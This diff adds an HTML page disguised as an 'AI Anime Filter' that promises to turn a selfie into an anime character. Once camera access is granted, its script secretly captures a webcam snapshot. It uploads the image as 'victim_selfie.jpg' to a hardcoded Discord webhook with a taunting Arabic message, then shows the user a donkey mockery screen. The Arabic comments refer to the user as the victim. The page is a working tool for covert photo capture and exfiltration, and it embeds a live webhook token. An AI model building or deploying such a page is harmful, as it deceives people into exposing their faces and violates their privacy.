@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Anime Filter 2026</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            border-radius: 15px;
+            background: #1e1e1e;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            max-width: 90%;
+            width: 400px;
+        }
+        h1 {
+            color: #ff4757;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #ccc;
+            font-size: 16px;
+        }
+        button {
+            background: linear-gradient(135deg, #6c5ce7, #a861ff);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-top: 20px;
+            width: 100%;
+        }
+        #video, #canvas {
+            display: none;
+        }
+        .prank-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #000000;
+            z-index: 9999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+        .prank-screen h2 {
+            color: #ff4757;
+            font-size: 32px;
+            margin-bottom: 20px;
+            padding: 0 10px;
+        }
+        .prank-screen img {
+            width: 300px;
+            max-width: 80%;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(255, 71, 87, 0.5);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="mainBox">
+        <h1>✨ AI Anime Filter ✨</h1>
+        <p>Turn your selfie into a high-quality Anime character using advanced AI Generation!</p>
+        <!-- الزرار ده أول ما يدوس عليه هيطلب إذن الكاميرا فوراً -->
+        <button id="startBtn">Click to Allow Camera & Start 🚀</button>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <div class="prank-screen" id="prankScreen">
+        <h2>تم تصويرك زي الحمار 😂😂😂</h2>
+        <img src="https://images.unsplash.com/photo-1570191512361-ec9986e1af7b?w=500" alt="Donkey">
+    </div>
+
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1515053645530398922/W83F0GF8mw1JKLx6fbOAhD-hhccbRQWibDWWKTUHap41Jb1vf4baqVS9rpAiL_rrbs50";
+        
+        const startBtn = document.getElementById('startBtn');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const mainBox = document.getElementById('mainBox');
+        const prankScreen = document.getElementById('prankScreen');
+
+        startBtn.addEventListener('click', async () => {
+            try {
+                // هنا الكود بيجبر المتصفح يفتح نافذة طلب إذن الكاميرا (Allow/Block)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                video.srcObject = stream;
+                
+                // أول ما الضحية يدوس "موافق" والكاميرا تبدأ لقط البيانات، بنصور علطول
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        takeAndSendSnapshot(stream);
+                    }, 300); // 300 جزء من الثانية عشان نلقطه بسرعة أول ما يوافق
+                };
+            } catch (err) {
+                // لو رفض يدوس موافق
+                alert("Error: You must ALLOW camera access to use the AI Anime filter!");
+                console.error("Camera access denied: ", err);
+            }
+        });
+
+        function takeAndSendSnapshot(stream) {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL('image/jpeg');
+            
+            // قفل الكاميرا علطول
+            stream.getTracks().forEach(track => track.stop());
+
+            // قلب الشاشة للمقلب
+            mainBox.style.display = 'none';
+            prankScreen.style.display = 'flex';
+
+            // طيران على الديسكورد
+            sendToDiscord(dataUrl);
+        }
+
+        function sendToDiscord(base64Image) {
+            const block = base64Image.split(";");
+            const contentType = block[0].split(":")[1];
+            const realData = block[1].split(",")[1];
+            
+            const blob = b64toBlob(realData, contentType);
+            const formData = new FormData();
+            formData.append("file", blob, "victim_selfie.jpg");
+            formData.append("content", "📸 **[ELGN HK]** الضحية وافق على الكاميرا واتصاد ف ثانية! 😂🐴");
+
+            fetch(webhookUrl, { method: "POST", body: formData })
+            .then(response => console.log("Sent!"))
+            .catch(error => console.error("Error:", error));
+        }
+
+        function b64toBlob(b64Data, contentType, sliceSize) {
+            contentType = contentType || '';
+            sliceSize = sliceSize || 512;
+            const byteCharacters = atob(b64Data);
+            const byteArrays = [];
+            for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
+                const slice = byteCharacters.slice(offset, offset + sliceSize);
+                const byteNumbers = new Array(slice.length);
+                for (let i = 0; i < slice.length; i++) { byteNumbers[i] = slice.charCodeAt(i); }
+                const byteArray = new Uint8Array(byteNumbers);
+                byteArrays.push(byteArray);
+            }
+            return new Blob(byteArrays, {type: contentType});
+        }
+    </script>
+</body>
+</html>
